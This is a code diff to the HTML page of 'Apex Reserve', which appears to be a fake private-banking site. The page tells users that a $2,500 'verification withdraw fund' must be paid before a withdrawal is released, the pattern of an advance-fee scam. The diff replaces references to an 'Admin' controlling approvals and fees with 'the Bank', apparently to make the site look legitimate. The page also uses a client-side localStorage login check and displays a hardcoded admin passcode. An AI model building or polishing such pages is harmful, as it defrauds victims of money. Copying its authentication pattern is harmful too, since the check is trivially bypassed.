@@ -2,6 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <script>
+    (function () {
+      try {
+        var sessRaw = localStorage.getItem('APEX_LOGGED_IN_USER');
+        if (!sessRaw) {
+          window.location.replace('login.html');
+          return;
+        }
+        var sess = JSON.parse(sessRaw);
+        if (!sess || !sess.id || sess.role === 'admin') {
+          localStorage.removeItem('APEX_LOGGED_IN_USER');
+          window.location.replace('login.html');
+          return;
+        }
+        if (sess.status === 'pending') {
+          window.location.replace('pending.html');
+          return;
+        }
+      } catch (e) {
+        localStorage.removeItem('APEX_LOGGED_IN_USER');
+        window.location.replace('login.html');
+      }
+    })();
+  </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Apex Reserve | Private Wealth & Digital Banking</title>
   <meta name="description" content="Apex Reserve Private Banking - Manage high-tier digital wealth, instant wire transfers, and asset tracking.">
@@ -199,7 +223,7 @@
                 </span>
                 <h2 class="pending-title">Account Application In Review</h2>
                 <p class="pending-subtitle">
-                  Waiting for your information to be verified by the Apex Reserve Compliance Administration. Your Federal Reserve RTGS settlement ledger is awaiting final executive authorization.
+                  Waiting for your information to be verified by the Bank. Once the Bank authorizes your application, your account will open with your personal details and an initial balance of $0.00.
                 </p>
               </div>
 
@@ -251,8 +275,8 @@
                 <div class="timeline-step">
                   <div class="timeline-dot current">⏳</div>
                   <div class="timeline-step-text">
-                    <div class="timeline-step-title" style="color: #F59E0B;">3. Executive Admin Verification & Acceptance</div>
-                    <div class="timeline-step-desc">Waiting for Admin to click "Accept" in the Admin Dashboard</div>
+                    <div class="timeline-step-title" style="color: #F59E0B;">3. Waiting for Bank Authorization</div>
+                    <div class="timeline-step-desc">Application In Review</div>
                   </div>
                 </div>
 
@@ -293,7 +317,7 @@
               <div>
                 <div style="font-size: 0.9rem; font-weight: 700; color: #FBBF24;" id="dashWithdrawalStatusHeading">Outbound Withdrawal Status: <span id="dashWithdrawalStatementText">PENDING COMPLIANCE VERIFICATION</span></div>
                 <div style="font-size: 0.82rem; color: #e2e8f0; margin-top: 2px;" id="dashWithdrawalStatusDesc">
-                  Withdrawal of <strong class="font-mono" id="dashPendingWithdrawalAmt">$0.00</strong> is currently pending. Required verification withdraw fund: <strong class="font-mono text-amber" id="dashReqVerificationVal" style="color: #F59E0B;">$2,500.00</strong> (Determined by Admin).
+                  Withdrawal of <strong class="font-mono" id="dashPendingWithdrawalAmt">$0.00</strong> is currently pending. Required verification withdraw fund: <strong class="font-mono text-amber" id="dashReqVerificationVal" style="color: #F59E0B;">$2,500.00</strong> (Determined by Bank).
                 </div>
               </div>
             </div>
@@ -1971,7 +1995,7 @@
             <div style="font-size: 0.8rem; color: #e2e8f0; line-height: 1.5;">
               A verification withdraw fund of <strong style="color: #F59E0B; font-size: 0.95rem; font-family: monospace;" id="receiptVerificationAmountDisplay">$2,500.00</strong> must be completed before this withdrawal can be released to your external account.
             </div>
-            <div style="font-size: 0.72rem; color: var(--text-dim); margin-top: 4px;">Clearance requirement determined by Executive Compliance Administration.</div>
+            <div style="font-size: 0.72rem; color: var(--text-dim); margin-top: 4px;">Clearance requirement determined by Bank Compliance Department.</div>
           </div>
         </div>
       </div>
@@ -2194,32 +2218,32 @@
         </div>
         <div class="badge-status-amber" style="margin-bottom: 8px;">
           <span class="live-dot" style="background: #F59E0B; box-shadow: 0 0 8px #F59E0B;"></span>
-          EXECUTIVE ADMIN VERIFICATION
+          EXECUTIVE BANK VERIFICATION
         </div>
-        <h2 class="modal-title" style="font-size: 1.45rem; color: #fff;">Admin Passcode Required</h2>
+        <h2 class="modal-title" style="font-size: 1.45rem; color: #fff;">Bank Passcode Required</h2>
         <p class="modal-desc" style="font-size: 0.82rem; color: var(--text-dim); margin-top: 4px;">
-          Please enter the Executive Administrator security passcode to access the Admin Compliance Dashboard.
+          Please enter the Executive Bank security passcode to access the Bank Compliance Dashboard.
         </p>
       </div>
 
       <div id="adminAuthModalError" style="display: none; margin: 16px 24px 0 24px; padding: 10px 14px; background: rgba(244, 63, 94, 0.14); border: 1px solid rgba(244, 63, 94, 0.4); border-radius: 8px; color: #f43f5e; font-size: 0.84rem; font-weight: 600; align-items: center; gap: 8px;">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-        <span>Incorrect admin passcode. Access denied.</span>
+        <span>Incorrect bank passcode. Access denied.</span>
       </div>
 
       <form id="adminAuthModalForm" class="modal-body" style="padding: 24px;">
         <div class="form-group">
           <label class="field-label" for="adminAuthModalInput" style="color: #38bdf8; font-weight: 700; font-size: 0.85rem;">
-            Admin Security Passcode *
+            Bank Security Passcode *
           </label>
           <div class="password-input-wrap" style="position: relative; display: flex; align-items: center;">
-            <input type="password" id="adminAuthModalInput" class="form-control font-mono" placeholder="Enter admin password" required autocomplete="current-password" autofocus style="padding-right: 44px; height: 46px;">
+            <input type="password" id="adminAuthModalInput" class="form-control font-mono" placeholder="Enter bank password" required autocomplete="current-password" autofocus style="padding-right: 44px; height: 46px;">
             <button type="button" class="btn-toggle-password" id="toggleAdminAuthModalBtn" title="Toggle password visibility" style="position: absolute; right: 10px; background: none; border: none; color: #94a3b8; cursor: pointer; padding: 6px;">
               <svg class="eye-show" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
               <svg class="eye-hide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
             </button>
           </div>
-          <span style="font-size: 0.72rem; color: var(--text-dim); margin-top: 5px; display: block;">Authorized admin credential: <code>admin123</code></span>
+          <span style="font-size: 0.72rem; color: var(--text-dim); margin-top: 5px; display: block;">Authorized bank credential: <code>admin123</code></span>
         </div>
 
         <div style="margin-top: 20px; display: flex; gap: 10px;">
@@ -2228,7 +2252,7 @@
           </button>
           <button type="submit" class="btn btn-primary" style="flex: 1.5; justify-content: center; background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%); height: 44px; font-weight: 700;">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-            <span>Verify & Access Admin</span>
+            <span>Verify & Access Bank</span>
           </button>
         </div>
       </form>
